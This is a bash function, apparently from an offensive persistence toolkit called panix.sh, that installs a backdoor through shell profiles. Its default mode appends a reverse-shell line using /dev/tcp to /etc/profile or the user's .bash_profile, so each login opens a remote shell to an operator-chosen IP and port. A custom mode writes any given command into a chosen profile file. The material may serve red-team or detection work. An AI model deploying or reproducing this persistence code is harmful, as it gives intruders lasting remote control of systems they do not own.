setup_shell_profile() {
	local profile_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	usage_shell_profile() {
		echo "Usage: ./panix.sh --shell-profile [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default shell profile settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom shell profile settings (make sure they are valid!)"
		echo "  --path <path>                Specify custom profile path"
		echo "  --command <command>          Specify custom persistence command (no validation)"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				profile_path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --shell-profile --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --shell-profile --custom --command \"(nohup bash -i > /dev/tcp/10.10.10.10/1337 0<&1 2>&1 &)\" --path \"/root/.bash_profile\""
				exit 0
				;;
			--help|-h)
				usage_shell_profile
				exit 0
				;;
			* )
				echo "Invalid option for --shell-profile: $1"
				echo "Try './panix.sh --shell-profile --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --shell-profile --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --shell-profile --help' for more information."
			exit 1
		fi

		if check_root; then
			profile_path="/etc/profile"
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.bash_profile"
		fi

		echo "(nohup bash -i > /dev/tcp/$ip/$port 0<&1 2>&1 &)" >> $profile_path
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $profile_path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './panix.sh --shell-profile --help' for more information."
			exit 1
		fi

		echo "$command" >> $profile_path
	else
		echo "Error: Either --default or --custom must be specified for --profile."
		echo "Try './panix.sh --shell-profile --help' for more information."
		exit 1
	fi

	echo "[+] Shell profile persistence established!"
}
